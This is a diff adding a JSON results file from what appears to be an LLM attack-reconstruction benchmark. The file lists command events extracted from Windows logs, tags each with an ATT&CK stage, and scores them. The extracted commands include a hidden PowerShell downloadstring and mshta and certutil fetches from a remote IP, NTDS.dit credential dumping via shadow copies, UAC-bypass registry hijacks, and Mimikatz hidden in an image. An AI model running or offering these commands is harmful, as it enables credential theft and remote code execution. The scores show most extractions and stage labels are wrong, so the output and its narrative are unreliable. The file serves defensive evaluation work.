@@ -1,0 +1,212 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u2605\u066d\u067e\u0651\u064e\u062e\u0631\u069a\ub365\u2039\u2019\u0440\u043e\u0432\u0243\u0325\u035c\u0301\u031f\u0362\u0482\u049fps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wmiprvse.exe -secured -Embedding",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon",
+        "stage": "Persistence"
+      },
+      {
+        "command": "Get-System -Technique NamedPipe -Verbose",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\system32\\calc.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"hkcu\\software\\classes\\mscfile\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \"hkcu\\software\\classes\\ms-settings\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "net group \\\"domain admins\\\" /domain",
+        "stage": "Discovery"
+      },
+      {
+        "command": "sc query type=service ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "vssadmin create shadow /for=c:",
+        "stage": "Collection"
+      },
+      {
+        "command": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\VSC_SYSTEM_HIVE & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM_HIVE",
+        "stage": "Collection"
+      },
+      {
+        "command": "wmic shadowcopy call create Volume=C:\\",
+        "stage": "Collection"
+      },
+      {
+        "command": "mkdir C:\\%HOMEPATH%\\Desktop\\T1022  & echo ipconfig /all > C:\\%HOMEPATH%\\Desktop\\T1022\\T1022.txt & 7z.exe a -tzip T1022.zip C:\\%HOMEPATH%\\Desktop\\T1022",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Get-ChildItem Env:",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Get-Process",
+        "stage": "Discovery"
+      },
+      {
+        "command": "Get-Service",
+        "stage": "Discovery"
+      },
+      {
+        "command": "doskey /history",
+        "stage": "Collection"
+      },
+      {
+        "command": "wmic process list",
+        "stage": "Discovery"
+      },
+      {
+        "command": "tree C:\\AtomicRedTeam\\atomics",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg add \"hkcu\\software\\classes\\folder\\shell\\open\\command\" -force -value 'cmd.exe /c notepad.exe'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "(gwmi -list win32_shadowcopy).Create('C:\\', 'ClientAccessible')",
+        "stage": "Collection"
+      },
+      {
+        "command": "New-Item -Path \"hkcu:\\software\\classes\\mscfile\\shell\\open\\command\" -Force New-ItemProperty -Path \"hkcu:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force Start-Process -FilePath $env:windir\\system32\\eventvwr.msc",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "New-Item -Path \"hkcu:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force New-ItemProperty -Path \"hkcu:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force Start-Process -FilePath $env:windir\\system32\\ComputerDefaults.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "New-Item -Path \"HKCU:\\software\\classes\\folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe' New-ItemProperty -Path \"HKCU:\\software\\classes\\folder\\shell\\open\\command\" -Name \"(default)\" -Value 'cmd.exe /c notepad.exe' Start-Process -FilePath $env:windir\\system32\\sdclt.exe Start-Sleep -s 3",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\\" /v \"verifierdlls\" /d \"1\" /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg delete \"HKEY_LOCAL_MACHINE\\software\\microsoft\\windows nt\\currentversion\\image file execution options\" /v verifierdlls /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "net stop wsearch",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg add \"hkcu\\environment\" /v windir /d \"cmd /c start powershell&REM \" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg delete \"hkcu\\environment\" /v windir /F",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "%temp%\\uacme\\56 Akagi64.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item '.\\msxsl.exe' 'c:\\Windows\\Temp\\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1548.002 -TestNumbers 2\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Import-Module .\\\\Invoke-PSImage.ps1;Invoke-PSImage -Script .\\\\Invoke-Mimikatz.ps1 -Out .\\\\evil-kiwi.png -Image .\\\\995647.jpg\"",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attackers gained initial access through an unknown vector however they managed to create persistence using scheduled tasks and registry entries. They collected system information and mapped the domain structure. The attackers escalated privileges using named pipe impersonation technique. Later they downloaded and executed various tools such as Mimikatz, PSImage etc for lateral movement.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 77931,
+      "completion_tokens": 2846,
+      "total_tokens": 80777,
+      "wall_clock_s": 89.987,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.15,
+      "recall": 0.375,
+      "f1": 0.21428571428571425,
+      "tp": 6,
+      "fp": 34,
+      "fn": 10
+    },
+    "stage": {
+      "precision": 0.05,
+      "recall": 0.13333333333333333,
+      "f1": 0.07272727272727272,
+      "tp": 2,
+      "fp": 38,
+      "fn": 13,
+      "recall_partial": 0.17857142857142858
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 77931,
+      "completion_tokens": 2846,
+      "total_tokens": 80777,
+      "wall_clock_s": 89.987,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
